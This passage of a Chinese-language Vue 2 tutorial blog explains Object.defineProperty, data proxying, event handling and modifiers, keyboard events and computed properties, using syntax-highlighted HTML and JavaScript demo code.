enumerable:true, //控制属性是否可以枚举(是否可以遍历)，默认值是false(属性名颜色会变淡)</span></span><br><span class="line">  <span class="comment">// writable:true, //控制属性是否可以被修改，默认值是false</span></span><br><span class="line">  <span class="comment">// configurable:true //控制属性是否可以被删除，默认值是false</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//当有人读取person的age属性时，get函数(getter)就会被调用，且返回值就是age的值</span></span><br><span class="line">  <span class="title function_">get</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;有人读取age属性了&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> number</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  <span class="comment">//当有人修改person的age属性时，set函数(setter)就会被调用，且会收到修改的具体值</span></span><br><span class="line">  <span class="title function_">set</span>(<span class="params">value</span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;有人修改了age属性，且值是&#x27;</span>,value)</span><br><span class="line">    number = value <span class="comment">// 要有这一步，否则person.age还是原值</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">// console.log(Object.keys(person))</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> key <span class="keyword">in</span> person)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;@@@&#x27;</span>, person[key])</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(person)</span><br></pre></td></tr></table></figure><p><img src="/images/defineproperty.png" alt="Image text"></p><h3 id="数据代理-1"><a href="#数据代理-1" class="headerlink" title="数据代理"></a>数据代理</h3><ul><li>数据代理：通过一个<code>对象代理</code>对另一个<code>对象</code>中<code>属性</code>的<code>操作（读/写）</code></li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> obj = &#123; <span class="attr">x</span>:<span class="number">100</span> &#125;</span><br><span class="line"><span class="keyword">let</span> obj2 = &#123; <span class="attr">y</span>:<span class="number">200</span> &#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(obj2,<span class="string">&#x27;x&#x27;</span>,&#123;</span><br><span class="line">  <span class="title function_">get</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> obj.<span class="property">x</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="title function_">set</span>(<span class="params">value</span>)&#123;</span><br><span class="line">    obj.<span class="property">x</span> = value</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h3 id="Vue中的数据代理"><a href="#Vue中的数据代理" class="headerlink" title="Vue中的数据代理"></a>Vue中的数据代理</h3><ul><li>1.Vue中的数据代理：<ul><li>通过<code>vm对象</code>来<code>代理data对象</code>中<code>属性的操作（读/写）</code></li></ul></li><li>2.Vue中数据代理的好处：<ul><li>更加<code>方便</code>的<code>操作data</code>中的<code>数据</code></li></ul></li><li>3.基本原理：<ul><li>通过<code>Object.defineProperty()</code>把<code>data对象</code>中所有<code>属性添加</code>到<code>vm</code>上。</li><li>为每一个<code>添加到vm上</code>的<code>属性</code>，都<code>指定</code>一个<code>getter/setter</code>。</li><li>在<code>getter/setter</code>内部去操作<code>（读/写）data</code>中对应的<code>属性</code>。<br><img src="/images/%E6%95%B0%E6%8D%AE%E4%BB%A3%E7%90%86.jpg" alt="Image text"><br><img src="/images/%E6%95%B0%E6%8D%AE%E4%BB%A3%E7%90%862.jpg" alt="Image text"></li></ul></li></ul><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Vue中的数据代理<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 引入Vue --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 准备好一个容器--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>学校名称：&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>学校地址：&#123;&#123;_data.address&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="title class_">Vue</span>.<span class="property">config</span>.<span class="property">productionTip</span> = <span class="literal">false</span>; <span class="comment">//阻止 vue 在启动时生成生产提示。</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">const</span> data = &#123;</span></span><br><span class="line"><span class="language-javascript">          <span class="attr">name</span>:<span class="string">&#x27;尚硅谷&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">          <span class="attr">address</span>:<span class="string">&#x27;宏福科技园&#x27;</span></span></span><br><span class="line"><span class="language-javascript">        &#125;;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> vm = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123; <span class="comment">// vm._data === data -&gt; true(vm._data就是data，vm._data中内容做了数据劫持)</span></span></span><br><span class="line"><span class="language-javascript"><span class="attr">el</span>:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">data</span></span><br><span class="line"><span class="language-javascript">&#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="事件处理"><a href="#事件处理" class="headerlink" title="事件处理"></a>事件处理</h2><h3 id="事件的基本使用"><a href="#事件的基本使用" class="headerlink" title="事件的基本使用"></a>事件的基本使用</h3><ul><li>事件的基本使用：<ul><li>1.使用<code>v-on:xxx</code> 或 <code>@xxx</code> 绑定事件，其中xxx是事件名；</li><li>2.<code>事件的回调</code>需要配置在<code>methods对象</code>中，最终会在<code>vm</code>上；</li><li>3.methods中配置的函数，<code>不要</code>用<code>箭头函数</code>！否则<code>this就不是vm</code>了；</li><li>4.methods中配置的函数，都是<code>被Vue</code>所管理的<code>函数</code>，<code>this的指向是vm 或 组件实例对象</code>；</li><li>5.<code>@click=&quot;demo&quot;</code> 和<code> @click=&quot;demo($event)&quot;</code> 效果一致，但后者可以传参；</li></ul></li></ul><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>事件的基本使用<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 引入Vue --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 准备好一个容器--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>欢迎来到&#123;&#123;name&#125;&#125;学习<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- &lt;button v-on:click=&quot;showInfo&quot;&gt;点我提示信息&lt;/button&gt; --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;showInfo1&quot;</span>&gt;</span>点我提示信息1（不传参）<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;showInfo2($event,66)&quot;</span>&gt;</span>点我提示信息2（传参）<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="title class_">Vue</span>.<span class="property">config</span>.<span class="property">productionTip</span> = <span class="literal">false</span> <span class="comment">//阻止 vue 在启动时生成生产提示。</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> vm = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="attr">el</span>:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript"><span class="attr">data</span>:&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="attr">name</span>:<span class="string">&#x27;尚硅谷&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">&#125;,</span></span><br><span class="line"><span class="language-javascript"><span class="attr">methods</span>:&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="title function_">showInfo1</span>(<span class="params">event</span>)&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="comment">// console.log(event.target.innerText)</span></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// console.log(this) //此处的this是vm</span></span></span><br><span class="line"><span class="language-javascript">                    <span class="comment">// console.log(this === vm) // true</span></span></span><br><span class="line"><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;同学你好！&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">&#125;,</span></span><br><span class="line"><span class="language-javascript"><span class="title function_">showInfo2</span>(<span class="params">event,number</span>)&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(event,number)</span></span><br><span class="line"><span class="language-javascript"><span class="comment">// console.log(event.target.innerText)</span></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// console.log(this) //此处的this是vm</span></span></span><br><span class="line"><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;同学你好！！&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript">&#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="事件修饰符"><a href="#事件修饰符" class="headerlink" title="事件修饰符"></a>事件修饰符</h3><ul><li>Vue中的事件修饰符：<ul><li>1.prevent：阻止默认事件（常用）(event.preventDefault())；</li><li>2.stop：阻止事件冒泡（常用）(event.stopPropagation())；</li><li>3.once：事件只触发一次（常用）；</li><li>4.capture：使用事件的捕获模式；<ul><li>嵌套事件：先捕获再冒泡，冒泡阶段处理事件，捕获阶段由外向内，冒泡阶段由内向外</li></ul></li><li>5.self：只有event.target是当前操作的元素时才触发事件；</li><li>6.passive：事件的默认行为立即执行，无需等待事件回调执行完毕；</li></ul></li></ul><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>事件修饰符<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 引入Vue --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">*&#123;</span></span><br><span class="line"><span class="language-css"><span class="attribute">margin-top</span>: <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"><span class="selector-class">.demo1</span>&#123;</span></span><br><span class="line"><span class="language-css"><span class="attribute">height</span>: <span class="number">50px</span>;</span></span><br><span class="line"><span class="language-css"><span class="attribute">background-color</span>: skyblue;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"><span class="selector-class">.box1</span>&#123;</span></span><br><span class="line"><span class="language-css"><span class="attribute">padding</span>: <span class="number">5px</span>;</span></span><br><span class="line"><span class="language-css"><span class="attribute">background-color</span>: skyblue;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"><span class="selector-class">.box2</span>&#123;</span></span><br><span class="line"><span class="language-css"><span class="attribute">padding</span>: <span class="number">5px</span>;</span></span><br><span class="line"><span class="language-css"><span class="attribute">background-color</span>: orange;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"><span class="selector-class">.list</span>&#123;</span></span><br><span class="line"><span class="language-css"><span class="attribute">width</span>: <span class="number">200px</span>;</span></span><br><span class="line"><span class="language-css"><span class="attribute">height</span>: <span class="number">200px</span>;</span></span><br><span class="line"><span class="language-css"><span class="attribute">background-color</span>: peru;</span></span><br><span class="line"><span class="language-css"><span class="attribute">overflow</span>: auto;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"><span class="selector-tag">li</span>&#123;</span></span><br><span class="line"><span class="language-css"><span class="attribute">height</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 准备好一个容器--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>欢迎来到&#123;&#123;name&#125;&#125;学习<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 阻止默认事件（常用） --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://www.atguigu.com&quot;</span> @<span class="attr">click.prevent</span>=<span class="string">&quot;showInfo&quot;</span>&gt;</span>点我提示信息<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 阻止事件冒泡（常用） --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;demo1&quot;</span> @<span class="attr">click</span>=<span class="string">&quot;showInfo&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click.stop</span>=<span class="string">&quot;showInfo&quot;</span>&gt;</span>点我提示信息<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 修饰符可以连续写 --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- &lt;a href=&quot;http://www.atguigu.com&quot; @click.prevent.stop=&quot;showInfo&quot;&gt;点我提示信息&lt;/a&gt; --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 事件只触发一次（常用） --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click.once</span>=<span class="string">&quot;showInfo&quot;</span>&gt;</span>点我提示信息<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">          </span><br><span class="line"><span class="comment">&lt;!-- 使用事件的捕获模式 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;box1&quot;</span> @<span class="attr">click.capture</span>=<span class="string">&quot;showMsg(1)&quot;</span>&gt;</span></span><br><span class="line">div1</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;box2&quot;</span> @<span class="attr">click</span>=<span class="string">&quot;showMsg(2)&quot;</span>&gt;</span></span><br><span class="line">div2</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 只有event.target是当前操作的元素时才触发事件； --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;demo1&quot;</span> @<span class="attr">click.self</span>=<span class="string">&quot;showInfo&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;showInfo&quot;</span>&gt;</span>点我提示信息<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 事件的默认行为立即执行，无需等待事件回调执行完毕； --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span> @<span class="attr">wheel.passive</span>=<span class="string">&quot;demo&quot;</span> <span class="attr">class</span>=<span class="string">&quot;list&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>1<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>2<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>3<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>4<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="title class_">Vue</span>.<span class="property">config</span>.<span class="property">productionTip</span> = <span class="literal">false</span> <span class="comment">//阻止 vue 在启动时生成生产提示。</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="attr">el</span>:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript"><span class="attr">data</span>:&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="attr">name</span>:<span class="string">&#x27;尚硅谷&#x27;</span></span></span><br><span class="line"><span class="language-javascript">&#125;,</span></span><br><span class="line"><span class="language-javascript"><span class="attr">methods</span>:&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="title function_">showInfo</span>(<span class="params">e</span>)&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;同学你好！&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript"><span class="comment">// console.log(e.target)</span></span></span><br><span class="line"><span class="language-javascript">&#125;,</span></span><br><span class="line"><span class="language-javascript"><span class="title function_">showMsg</span>(<span class="params">msg</span>)&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(msg)</span></span><br><span class="line"><span class="language-javascript">&#125;,</span></span><br><span class="line"><span class="language-javascript"><span class="title function_">demo</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++) &#123;</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;#&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;累坏了&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript">&#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="键盘事件"><a href="#键盘事件" class="headerlink" title="键盘事件"></a>键盘事件</h3><ul><li>1.Vue中常用的按键别名：<ul><li>回车 =&gt; enter</li><li>删除 =&gt; delete (捕获“删除”和“退格”键)</li><li>退出 =&gt; esc</li><li>空格 =&gt; space</li><li>换行 =&gt; tab (特殊，必须配合keydown去使用)</li><li>上 =&gt; up</li><li>下 =&gt; down</li><li>左 =&gt; left</li><li>右 =&gt; right</li></ul></li><li>2.Vue未提供别名的按键，可以使用按键原始的key值去绑定，但注意要转为kebab-case（短横线命名）</li><li>3.系统修饰键（用法特殊）：ctrl、alt、shift、meta<ul><li>(1).配合keyup使用：按下修饰键的同时，再按下其他键，随后释放其他键，事件才被触发。</li><li>(2).配合keydown使用：正常触发事件。</li></ul></li><li>4.也可以使用keyCode去指定具体的按键（不推荐）</li><li>5.Vue.config.keyCodes.自定义键名 = 键码，可以去定制按键别名</li></ul><h2 id="计算属性-computed"><a href="#计算属性-computed" class="headerlink" title="计算属性-computed"></a>计算属性-computed</h2><p><code>只要data中的数据发生变化，vue一定会重新解析模版的</code></p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>姓名案例_methods实现<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 引入Vue --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 准备好一个容器，模版 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">姓：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;firstName&quot;</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">名：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;lastName&quot;</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">全名：<span class="tag">&lt;<span class="name">span</span>&gt;</span>&#123;&#123;fullName()&#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="title class_">Vue</span>.<span class="property">config</span>.<span class="property">productionTip</span> = <span class="literal">false</span> <span class="comment">//阻止 vue 在启动时生成生产提示。</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="attr">el</span>:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript"><span class="attr">data</span>:&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="attr">firstName</span>:<span class="string">&#x27;张&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript"><span class="attr">lastName</span>:<span class="string">&#x27;三&#x27;</span></span></span><br><span class="line"><span class="language-javascript">&#125;,</span></span><br><span class="line"><span class="language-javascript"><span class="attr">methods</span>: &#123;</span></span><br><span class="line"><span class="language-javascript"><span class="title function_">fullName</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;@---fullName&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">firstName</span> + <span class="string">&#x27;-&#x27;</span> + <span class="variable language_">this</span>.<span class="property">lastName</span></span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript">&#125;,</span></span><br><span class="line"><span class="language-javascript">&#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>计算属性：<ul><li>1.定义：要用的<code>属性不存在</code>，要通过<code>已有属性计算</code>得来。</li><li>2.原理：底层借助了<code>Objcet.defineProperty方法</code>提供的<code>getter和setter</code>。</li><li>3.get函数什么时候执行？<ul><li>(1).<code>初次</code>读取时会<code>执行一次</code>。</li><li>(2).当<code>依赖的数据</code>发生<code>改变</code>时会被<code>再次调用</code>。</li></ul></li><li>4.set什么时候调用?<ul><li>当fullName被<code>修改</code>时</li></ul></li><li>5.优势：与methods实现相比，<code>内部有缓存机制（复用</code>），<code>效率更高</code>，<code>调试方便</code>。</li><li>6.备注：<ul><li>1.计算属性最终会出现在vm上，直接读取使用即可。</li><li>2.如果计算属性要被修改，那必须写set函数去响应修改，且set中要引起计算时依赖的数据发生改变。</li></ul></li></ul></li></ul><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>姓名案例_计算属性实现<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 引入Vue --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span 